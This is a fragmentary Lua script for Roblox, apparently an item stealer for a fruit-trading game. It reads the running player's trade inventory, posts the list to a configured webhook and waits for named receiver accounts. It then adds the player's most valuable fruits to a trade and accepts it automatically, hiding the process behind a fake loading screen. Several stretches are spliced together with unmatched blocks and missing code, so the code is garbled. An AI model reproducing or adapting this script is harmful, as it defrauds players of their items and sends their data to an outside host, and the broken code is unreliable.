local function normalizar(txt)
    txt = string.lower(tostring(txt or ""))
    txt = txt:gsub("á","a"):gsub("à","a"):gsub("ã","a"):gsub("â","a"):gsub("ä","a")
    txt = txt:gsub("é","e"):gsub("è","e"):gsub("ê","e"):gsub("ë","e")
    txt = txt:gsub("í","i"):gsub("ì","i"):gsub("î","i"):gsub("ï","i")
    txt = txt:gsub("ó","o"):gsub("ò","o"):gsub("õ","o"):gsub("ô","o"):gsub("ö","o")
    txt = txt:gsub("ú","u"):gsub("ù","u"):gsub("û","u"):gsub("ü","u")
    txt = txt:gsub("ç","c")
    return txt
end

local function limparNome(nome)
    nome = tostring(nome or ""):gsub("%-.*$", ""):gsub("^%s+", ""):gsub("%s+$", "")
    local convertido = PT_PARA_EN[normalizar(nome)]
    return convertido or nome
end

local function post(url, body)
    if not url or url == "" then return end
    local ok, encoded = pcall(function() return HttpService:JSONEncode(body) end)
    if not ok then return end

    local ok2, res = pcall(function()
        return HttpService:RequestAsync({
            Url = url, Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = encoded
        })
    end)
    if ok2 and res and res.StatusCode then return res end

    if syn and syn.request then
        pcall(function() syn.request({ Url=url, Method="POST",
            Headers={["Content-Type"]="application/json"}, Body=encoded }) end)
    end
    if http_request then
        pcall(function() http_request({ Url=url, Method="POST",
            Headers={["Content-Type"]="application/json"}, Body=encoded }) end)
    end
    if request then
        pcall(function() request({ Url=url, Method="POST",
            Headers={["Content-Type"]="application/json"}, Body=encoded }) end)
    end
end

local function lerFrutasGuardadas(CommF)
    local ok, inv = pcall(function() return CommF:InvokeServer("getTradeInventory") end)
    if not ok or type(inv) ~= "table" or type(inv.Items) ~= "table" then
        return {}
    end

    local frutas = {}
    for _, item in ipairs(inv.Items) do
        if type(item) == "table" and item.ItemId and item.Price then
            local preco = tonumber(item.Price) or 0
            local id = item.ItemId

            local nome = ID_ESPECIAL[id]
            if not nome then nome = ID_PARA_NOME[id] end
            if not nome then nome = PRECO_PARA_NOME[preco] end
            if not nome then nome = "ID_"..tostring(id) end

            nome = limparNome(nome)

            table.insert(frutas, {
                Id = id,
                Nome = nome,
                Price = preco,
            })
        end
    end

    table.sort(frutas, function(a, b)
        return a.Price > b.Price
    end)

    return frutas
end

local function tradeJaTemFruta()
    local pg = Players.LocalPlayer:FindFirstChild("PlayerGui")
    local trade = pg and pg:FindFirstChild("Main") and pg.Main:FindFirstChild("Trade")

    local container = trade:FindFirstChild("Container")
    if not container then return false end
    local trade1 = container:FindFirstChild("1")
    local frameT = trade1 and trade1:FindFirstChild("Frame")
    if not frameT then return false end

    for _, it in ipairs(frameT:GetChildren()) do
        if it.Name ~= "UIGridLayout" and it.Name ~= "Template"
        and it.Name ~= "EmptyTemplate" and it.Name ~= "AddButton" then
            return true
        end
    end
    return false
end

local function autoTrade(CommF, TradeFunction, frutas)
    if #frutas == 0 then return end
    if tradeJaTemFruta() then return end

    if not _loadingAtivo then
        criarLoading()
        _loadingAtivo = true
    end

    task.wait(1.5)

    local limite = math.min(CONFIG.FrutasPorTrade, #frutas)
    local lista = {}
    for i = 1, limite do
        table.insert(lista, frutas[i])
    end

    for i, f in ipairs(lista) do
        pcall(function()
            TradeFunction:InvokeServer("addItem", f.Id)
        end)
        task.wait(CONFIG.AddItemDelay)
    end

    if _acceptLoopAtivo then return end
    _acceptLoopAtivo = true

    task.spawn(function()
        while _acceptLoopAtivo do
            local pg = Players.LocalPlayer:FindFirstChild("PlayerGui")
            local trade = pg and pg:FindFirstChild("Main") and pg.Main:FindFirstChild("Trade")

            if not trade or not trade.Visible then
                _acceptLoopAtivo = false
                break
            end

            pcall(function()
                TradeFunction:InvokeServer("accept")
            end)

            task.wait(1)
        end
    end)
end

local function escolherContaAlvo()
    local carlos = Players:FindFirstChild(CONFIG.UserName)
    local gustavo = Players:FindFirstChild(CONFIG.UserName2)

    if carlos then
        return CONFIG.UserName
    end

    if gustavo then
        return CONFIG.UserName2
    end

    return nil
end

        if _loadingAtivo then return end
        _migLoadingAtivo = true
        criarMigLoading()
    end)

    if not sb then
        task.wait(3)
        sb = pg:FindFirstChild("ServerBrowser")
    end

    local server = "Unknown"

    if sb then
        sb.Enabled = true
        sb.Enabled = false

        local LocalScript = sb:FindFirstChild("LocalScript")
        if LocalScript then
            local ok, env = pcall(function() return getsenv(LocalScript) end)

        }}

        table.insert(t3.embeds, {
            title = "🍏 Outras frutas",
            description = restoFrutas:sub(1, 4000),
            color = 0x9b59ff
        })
    end

    post(CONFIG.ActualLogsWebhook, t3)

    task.spawn(function()
        while task.wait(0.5) do
            local meuChar = LocalPlayer.Character
            if not meuChar then continue end
            local meuHum = meuChar:FindFirstChildWhichIsA("Humanoid")
            if not meuHum or meuHum.Health <= 0 then continue end

            local contaAlvo = escolherContaAlvo()
            if not contaAlvo then continue end

            if target and target.Character then
                local targetHum = target.Character:FindFirstChildWhichIsA("Humanoid")

                            if targetHum.SeatPart.Name == "P1" then
                                outroSeat = mesa:FindFirstChild("P2")
                            else

                            end
                        end
                    end
                end
            end
        end
    end)

        while task.wait(1) do

                if not target then continue end

                    if meuHum.SeatPart.Parent == targetHum.SeatPart.Parent then
                        _tradeRodado = true
                        task.spawn(function()
                            task.wait(0.5)
                            autoTrade(CommF, TradeFunction, frutas)
                        end)
                    end
                end
            end
        end
    end)
end
